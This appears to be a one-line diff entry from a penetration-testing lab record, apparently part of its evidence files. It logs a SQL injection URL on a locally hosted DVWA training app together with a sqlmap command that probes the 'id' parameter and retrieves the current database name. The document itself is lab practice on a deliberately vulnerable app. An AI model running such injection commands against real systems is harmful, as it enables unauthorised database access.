@@ -1,0 +1,1 @@
+http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -r evidence/dvwa_sqli_request.txt -p id --batch --risk=1 --level=1 --current-db --output-dir=evidence/sqlmap-output
